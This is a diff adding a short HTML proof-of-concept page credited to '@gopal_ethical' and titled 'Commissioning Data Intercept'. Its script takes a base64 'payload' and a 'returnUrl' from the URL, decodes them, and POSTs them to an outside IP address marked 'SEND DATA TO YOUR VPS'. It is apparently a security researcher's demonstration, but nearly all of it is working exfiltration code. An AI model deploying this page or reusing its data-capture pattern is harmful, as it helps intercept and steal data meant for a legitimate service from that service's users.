@@ -1,4 +1,52 @@
+<!DOCTYPE html>
 <html>
+<head>
+    <title>Commissioning Data Intercept</title>
+    <meta charset="UTF-8">
+</head>
   <h1>poc by</h1>
   <h2>@gopal_ethical</h2>
+<body>
+    <h1>Commissioning Payload Intercepted</h1>
+    <pre id="output">Waiting for data...</pre>
+
+    <script>
+        function getQueryParam(param) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(param);
+        }
+
+        function decodeBase64Json(base64) {
+            try {
+                const jsonStr = atob(base64);
+                return JSON.parse(jsonStr);
+            } catch (e) {
+                return { error: "Failed to decode payload", details: e.message };
+            }
+        }
+
+        const payload = getQueryParam("payload");
+        const returnUrl = getQueryParam("returnUrl");
+        const decoded = decodeBase64Json(payload);
+
+        const dataToSend = {
+            payload: decoded,
+            returnUrl: returnUrl,
+            timestamp: new Date().toISOString()
+        };
+
+        document.getElementById("output").textContent = JSON.stringify(dataToSend, null, 4);
+
+        // 🔴 SEND DATA TO YOUR VPS
+        fetch("http://123.45.67.89:8080/log", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(dataToSend)
+        }).then(res => {
+            console.log("Data sent to server:", res.status);
+        }).catch(err => {
+            console.error("Failed to send to server:", err);
+        });
+    </script>
+</body>
 </html>
